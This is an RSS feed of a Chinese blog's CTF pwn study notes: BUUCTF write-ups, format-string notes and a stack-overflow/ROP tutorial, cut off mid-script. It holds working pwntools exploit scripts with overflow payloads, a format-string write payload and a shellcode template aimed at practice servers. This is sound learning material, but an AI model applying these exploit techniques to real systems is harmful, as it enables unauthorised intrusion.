<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>木提青</title>
        <subtitle>blog</subtitle>
        <icon>http://jexy-kynner.github.io/images/favicon.ico</icon>
        <link>http://Jexy-Kynner.github.io</link>
        <author>
          <name>Jexy-Kynner</name>
        </author>
        <description>木提青本青</description>
        <language>zh-CN</language>
        <pubDate>Wed, 05 Jun 2024 23:23:26 +0800</pubDate>
        <lastBuildDate>Wed, 05 Jun 2024 23:23:26 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://jexy-kynner.github.io/2024/06/05/BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/</guid>
            <title>BUU刷题（2）</title>
            <link>http://jexy-kynner.github.io/2024/06/05/BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/</link>
            <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
            <category term="stack" scheme="http://jexy-kynner.github.io/tags/stack/" />
            <pubDate>Wed, 05 Jun 2024 23:23:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;others_shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#others_shellcode&#34;&gt;#&lt;/a&gt; others_shellcode&lt;/h1&gt;
&lt;p&gt;用的是 ret2syscall&lt;br&gt;
&lt;img data-src=&#34;//BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/1.bmp&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;from pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;node5&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25448&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;我很疑惑为什么没有 ebx ecx edx 寄存器对应参数，只有程序自带的 eax,/bin//sh,int80...&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/2.bmp&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//BUU%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/3.bmp&#34; alt&gt;&lt;br&gt;
好啦，edx 是 0，ebx,ecx 参数已经读取 esp 被传上去了&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://jexy-kynner.github.io/2024/06/01/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</guid>
            <title>格式化字符串</title>
            <link>http://jexy-kynner.github.io/2024/06/01/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</link>
            <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
            <category term="stack" scheme="http://jexy-kynner.github.io/tags/stack/" />
            <category term="刷题" scheme="http://jexy-kynner.github.io/tags/%E5%88%B7%E9%A2%98/" />
            <pubDate>Sat, 01 Jun 2024 00:54:47 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;诶&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNodW5xaXUvcC85MzI5Mzg3Lmh0bWw=&#34;&gt;&lt;/span&gt;&lt;br&gt;
 [参考博客]: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeV9fX3lzeS9hcnRpY2xlL2RldGFpbHMvMTM1NzAwMTQw&#34;&gt;https://blog.csdn.net/ysy___ysy/article/details/135700140&lt;/span&gt;&lt;br&gt;
 [参考博客]: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI0MDJfODM0MjIzNTcvYXJ0aWNsZS9kZXRhaWxzLzEzOTE4MDQwNA==&#34;&gt;https://blog.csdn.net/2402_83422357/article/details/139180404&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzk0NjEyL2FydGljbGUvZGV0YWlscy84NDkwMDY2OA==&#34;&gt; 戳此切大佬博客&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如输出第五个参数可以写为 %4&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;，第六个为&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s，第六个为%5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;第&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;六&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s，需要输出第 n 个参数就是 %(n-1)[格式化控制符]。因此我们的payload可以简化为”\x01\x80\x04\x08%5s”&lt;/p&gt;
&lt;p&gt;有一个还挺方便的函数 payload = fmtstr_payload (偏移，{原地址：目的地址})&lt;br&gt;
payload = fmtstr_payload(11,{0x0804A048:0xC0})&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://jexy-kynner.github.io/2024/06/01/BUU%E5%88%B7%E9%A2%98(1)/</guid>
            <title>BUU刷题(1)</title>
            <link>http://jexy-kynner.github.io/2024/06/01/BUU%E5%88%B7%E9%A2%98(1)/</link>
            <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
            <category term="stack" scheme="http://jexy-kynner.github.io/tags/stack/" />
            <category term="刷题" scheme="http://jexy-kynner.github.io/tags/%E5%88%B7%E9%A2%98/" />
            <pubDate>Sat, 01 Jun 2024 00:50:47 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ciscn_2019_n_1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn_2019_n_1&#34;&gt;#&lt;/a&gt; ciscn_2019_n_1&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/aCDsHiRp5zBlm9k.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;覆盖 v1-&amp;gt;system 地址&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;from pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;node5&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;25432&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token char&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4006BE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;jarvisoj_level0&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jarvisoj_level0&#34;&gt;#&lt;/a&gt; jarvisoj_level0&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/jg9iPpUSV85fdMC.jpg&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/B4wyUVYizlQnLH8.jpg&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;from pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;node5&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;27244&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token char&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x40059A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://jexy-kynner.github.io/2024/05/22/ROP/</guid>
            <title>ROP</title>
            <link>http://jexy-kynner.github.io/2024/05/22/ROP/</link>
            <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
            <category term="stack" scheme="http://jexy-kynner.github.io/tags/stack/" />
            <pubDate>Wed, 22 May 2024 00:22:44 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;栈溢出原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#栈溢出原理&#34;&gt;#&lt;/a&gt; 栈溢出原理&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/HW7zjmqDtJYn5G3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;先把基本栈溢出原理说清楚，上图可能不太清晰。&lt;br&gt;
自己的话讲就是函数 A 原本 rbp 和 rsp,call 调用函数 B 后，rbp 上去变成 rsp, 原本的 rsp 随着函数 B 各种参数，寄存器 balabala 继续往栈顶生长。调用 B 完再逆操作，回到函数 A,rbp 回到函数 A 的返回地址，rsp 回到函数 B 底部，leave 之后 ret 进入 A&lt;br&gt;
&lt;strong&gt; 所以！！我们怎么利用呢&lt;/strong&gt;&lt;br&gt;
距离 rbp 在调用完函数 B 回到函数 A 时，我们已经把函数 B 溢出点距离 rbp 的内容填满，加上目标地址，最后回到函数 A 过程中，rbp 就在目标地址那&lt;br&gt;
&lt;em&gt;通俗：溢出点距离 rbp 多少空间 + 目标地址 + rbp (64-8//32-4)-&amp;gt; 发送这个&lt;/em&gt;&lt;br&gt;
嗯，应该是这样的，不对回来再改（U ´ᴥ` U）&lt;/p&gt;
&lt;h2 id=&#34;查看偏移量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看偏移量&#34;&gt;#&lt;/a&gt; 查看偏移量&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1.&lt;/span&gt;直接在&lt;span class=&#34;token constant&#34;&gt;IDA&lt;/span&gt;里眼瞅&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;2.&lt;/span&gt;用cyclic&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pwndbg&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; cyclic &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pwndbg&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        看到报错“&lt;span class=&#34;token class-name&#34;&gt;Invalid&lt;/span&gt; address &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;xxxx&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;”&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pwndbg&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; cyclic &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;l &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;xxxx&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;或者haab&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token number&#34;&gt;3.&lt;/span&gt;gdb&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;peda&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        用法和cyclic差不多，&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pattern create &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        c&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pattern offset &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;xxxx&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;ret2text适用于可以看到system后门函数的时候用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2text适用于可以看到system后门函数的时候用&#34;&gt;#&lt;/a&gt; ret2text———— 适用于可以看到 system 后门函数的时候用&lt;/h1&gt;
&lt;p&gt;上题目！————Buu--warmup_csaw_2016&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/9PKad1Fcem2BoD7.jpg&#34; alt=&#34;alt text&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;gets () 危险函数，v5 就是溢出点，距离 0x40&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2024/06/02/fApI3skWJS5E69w.jpg&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;应该选择压入参数 cat flag 的地址 0x400611&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;from pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;node5&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token char&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x400611&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;ret2shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ret2shellcode&#34;&gt;#&lt;/a&gt; ret2shellcode&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;没有后门函数，没有直接的 system (/bin/sh) 的时候用！&lt;/em&gt;&lt;br&gt;
&lt;em&gt;shellcode 所在的区域具有可执行权限！&lt;/em&gt;———— 所以开启 NX 保护应该是用不了的&lt;br&gt;
让它在脚本里生成一个 shellcode（指令为:shellcode = asm (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsY3JhZnQuc2g=&#34;&gt;shellcraft.sh&lt;/span&gt;())）&lt;br&gt;
这个是 pwntools 自带的，用这个相当于我们整了一个 /bin/sh 过去&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;基本脚本：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    from pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 废话（bushi）但是要写&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;balabala&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ip&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    shellcode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shellcraft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 